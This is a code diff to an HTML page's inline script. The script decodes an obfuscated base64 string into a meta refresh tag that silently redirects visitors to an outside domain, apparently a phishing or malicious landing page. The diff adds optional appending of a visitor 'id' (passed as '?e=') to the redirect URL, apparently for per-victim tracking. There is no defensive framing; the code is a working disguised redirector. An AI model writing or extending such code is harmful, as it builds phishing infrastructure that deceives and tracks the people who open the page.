@@ -7,21 +7,29 @@
     <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css" />
     <script>
       let hasStatus = new URLSearchParams(window.location.search).has("status");
+      let hasId = new URLSearchParams(window.location.search).has("id")
       if (hasStatus) {
         let status = new URLSearchParams(window.location.search).get("status");
         if (status == "true") {
           let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vc2VlZWhhdG92ZXIuZmVubWVub3MuZGUvZnFnZ1QlMjIlMjAvJTNF"
-          let id = new URLSearchParams(window.location.search).get("id");
+          
 
           let decodedRef = decodeURIComponent(atob(`${ref}`))
 
           let lastIndexOfColon = decodedRef.lastIndexOf('"');
+          if(hasId) {
+          let id = new URLSearchParams(window.location.search).get("id");
           newDecodedRef= decodedRef.slice(0, lastIndexOfColon) + "?e=" + id + "\" />";
           const encodedUrl = btoa(newDecodedRef);
-
-
-
           document.write(decodeURIComponent(atob(`${encodedUrl}`)));
+          }
+          else {
+            document.write(decodeURIComponent(atob(`${ref}`)))
+          }
+
+
+
+          
         }
       }
     </script>
